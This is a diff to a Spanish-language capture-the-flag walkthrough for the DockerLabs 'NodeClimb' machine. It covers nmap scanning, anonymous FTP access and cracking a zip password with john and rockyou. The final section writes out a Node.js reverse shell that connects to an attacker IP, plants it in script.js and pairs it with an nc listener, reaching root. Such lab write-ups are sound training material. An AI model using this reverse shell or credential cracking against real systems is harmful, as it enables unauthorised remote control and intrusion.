@@ -1,17 +1,21 @@
 # NodeClimb-DockerLab
 DockerLab - Machine
 
-![Captura de pantalla maquina chocolateFire - Dockerlab](images/Image_step_home.png)
+![Captura de pantalla maquina NodeClimb - Dockerlab](images/Image_step_home.png)
 
 ## Reconocimiento
 
 
 ## Escaneo y enumeración
 
+Ahora podemos revisar que contiene la máquina usando nmap y el siguiente script.
+
+Al realizar un escaneo con Nmap, podemos usar el siguiente comando:
 ```
 nmap -sV --script vuln --host-timeout 2500 -oN scan_v2_172.17.0.2.txt 172.17.0.2
 ```
 
+Obtenemos el siguiete resultado, como podemos ver nos eentrega bastante información, pero no muy útil.
 ```
 # Nmap 7.94SVN scan initiated Tue Aug 20 11:56:43 2024 as: nmap -sV --script vuln --host-timeout 2500 -oN scan_v2_172.17.0.2.txt 172.17.0.2
 Nmap scan report for 172.17.0.2
@@ -118,5 +122,148 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ```
 
+Debemos modifcar un poco el comando de Nmap para revisar que tenemos dentro de la máquina. Ahora usamos el siguiente script:
+```
+nmap -sV -sCV -p21,22 --host-timeout 2500 -oN scan_v3_172.17.0.2.txt 172.17.0.2
+```
+
+Obtenemos el siguiente resultado del escaneo:
+```
+# Nmap 7.94SVN scan initiated Tue Aug 20 12:03:45 2024 as: nmap -sV -sCV -p21,22 --host-timeout 2500 -oN scan_v3_172.17.0.2.txt 172.17.0.2
+Nmap scan report for 172.17.0.2
+Host is up (0.000061s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.17.0.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
+|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Aug 20 12:03:46 2024 -- 1 IP address (1 host up) scanned in 1.07 seconds
+
+```
+
+Aquí podemos ver que dentro del resultado, hay un servicio dentro del puerto 21(TCP) que es del servicio FTP, y en donde lo llamativo es que es de Acceso Anónimo ("Anonymous - inglés").
+
+### Revisión del Pueto 21, servicio de FTP
+Podemos ver que dentro del acceso, vía FTP encontramos el archivo "secretitopicaron.zip"
+
+![Captura de pantalla maquina FTP - Dockerlab](images/Image_step_01.png)
+
+Al tratar de abrir el archivo, podemos ver que está asegurdado por contraseña.
+
+### Abrir el archivo con contraseña (https://www.kali.org/tools/john/#zip2john)
+Una forma de acceder al archivo comprimido y protegido por contraseña, es usando un paquete de John, llamado "zip2john", de esta manera transformamos el archivo zip a hash.
+
+```
+zip2john secretitopicaron.zip > secretohash
+```
+Una vez, ya teniendo el archivo hash, procedemos a crackearlo con usando john y el arhivo: '/usr/share/wordlists/rockyou.txt'.
+```
+john --format=PKZIP -w /usr/share/wordlists/rockyou.txt secretohash
+```
+
+El resultado obtenido es:
+```
+john --format=PKZIP -w /usr/share/wordlists/rockyou.txt secretohash
+Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Proceeding with wordlist:/usr/share/john/password.lst
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password1        (secretitopicaron.zip/password.txt)     
+1g 0:00:00:00 DONE (2024-08-16 18:19) 20.00g/s 70920p/s 70920c/s 70920C/s 123456..sss
+Use the --show option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Como se ve en el script anterior, la contraseña del archivo comprimido es 'password1'
+
+![Captura de pantalla maquina vista contenido archivo comprimido - Dockerlab](images/Image_step_02.png)
+
+En este únto podemos revisar el contenido del archivo plano "password.txt", donde vemos una contraseña para el usuario "mario".
+
+![Captura de pantalla maquina vista contenido archivo comprimido - Dockerlab](images/Image_step_03.png)
+
+### Acceso por SSH (puerto 22)
+Ya hemos encontrado que tenemos un usuario anónimo para ingresar por FTP. Pero ahora, podemos revisar si el usuario encontrado "mario", puede ayudarnos a ingresar vía SSH.
+
+![Captura de pantalla maquina acceso vía SSH - Dockerlab](images/Image_step_04.png)
+
+El resultado entregado por la terminal, de acceso a SSH, vemos que no tenemos permisos elevados dentro de la máquina.
 
 ## Ganar Acceso
+Para ganar acceso. debemos ver que contiene la máquina.
+
+![Captura de pantalla maquina contenido del directorio SSH - Dockerlab](images/Image_step_05.png)
+
+Se puede ver que contiene un archivo script.js. El archivo en cuestión no posee contenido, es un archivo vacío. pero tal vez, podamos hacer algo, si es que podemos ejecutar con NodeJs o algo similar. Debemos revisar que contiene la máquiana instalada.
+
+![Captura de pantalla maquina contenido del directorio BIN - Dockerlab](images/Image_step_06.png)
+
+Viendo el listado de contenidos del directorio Bin, podemos ver que está instalado el paquete nodeJs enlazado a node.
+
+![Captura de pantalla maquina contenido del directorio BIN/node - Dockerlab](images/Image_step_07.png)
+
+### Ganado acceso ví revershell
+Para tratar de ganar acceso a la máquina podemos hacer uso del archivo script.js e insertar dentro de este archivo un algoritmo reverso, para este propósito podemos consultar en www.revshells.com y configurar las siguientes opciones "node.js#2 -OS linux"
+
+```
+(function(){     var net = require("net"),
+cp = require("child_process"),
+sh = cp.spawn("sh", []);
+var client = new net.Socket();
+client.connect(1111, "10.0.2.15", function(){         
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+    });
+    return /a/; 
+    })();'
+```
+
+Debemos insertar este script reverso de node, dentro del archivo script.js. Antes de hacer esto, debemos configurar una ip y puerto dentro del algoritmo generado. Todo esto lo podemos realizar de la siguiente manera dentro de la terminal (recordar que la IP y puerto, son de la máquina atacante):
+
+```
+echo '(function(){     var net = require("net"),         cp = require("child_process"),         sh = cp.spawn("sh", []);     var client = new net.Socket();     client.connect(1111, "10.0.2.15", function(){         client.pipe(sh.stdin);         sh.stdout.pipe(client);         sh.stderr.pipe(client);     });     return /a/; })();' > script.js
+
+```
+
+Hecho lo anterior, aún no basta para que funcione el algoritmo reverso, debemos volver a nuestra máquina kali y dejar un puerto a la escucha de lo enviado por el script reverso. Basta con usar el siguiente comando:
+
+```
+sudo nc -lnvp 1111
+```
+Podemos ver que al ajecutarlo, queda a la espera de comunicación.
+
+![Captura de pantalla maquina contenido del directorio BIN/node - Dockerlab](images/Image_step_08.png)
+
+Ahora ejecutamos el algoritmo dentro de la máquina NodeClimb, y quedamos a la espera de la comunicación dentro de la máquina atacnate.
+
+![Captura de pantalla maquina contenido del directorio BIN/node - Dockerlab](images/Image_step_09.png)
+
+Si todo resulta bien, debemos poder llegar a la máquina NodeClimb con el usuario root.
+
+![Captura de pantalla maquina contenido del directorio BIN/node - Dockerlab](images/Image_step_10.png)
+
+Gracias por leer.
